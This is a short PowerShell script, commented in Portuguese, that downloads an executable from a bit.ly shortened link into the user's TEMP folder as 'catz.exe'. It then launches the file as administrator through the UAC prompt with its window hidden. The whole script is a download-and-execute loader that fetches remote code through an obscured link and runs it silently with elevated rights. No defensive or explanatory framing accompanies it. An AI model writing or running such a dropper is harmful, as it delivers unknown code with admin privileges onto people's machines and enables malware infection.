# URL do arquivo que você quer baixar e executar
$url = "https://bit.ly/48eh5jq"  # Substitua pela URL real do arquivo

# Caminho onde o arquivo será salvo na pasta TEMP do usuário
$output = Join-Path $env:TEMP "catz.exe"

# Baixa o arquivo
(New-Object System.Net.WebClient).DownloadFile($url, $output)

# Executa o arquivo baixado como administrador (vai abrir prompt UAC)
Start-Process -FilePath $output -Verb RunAs -WindowStyle Hidden
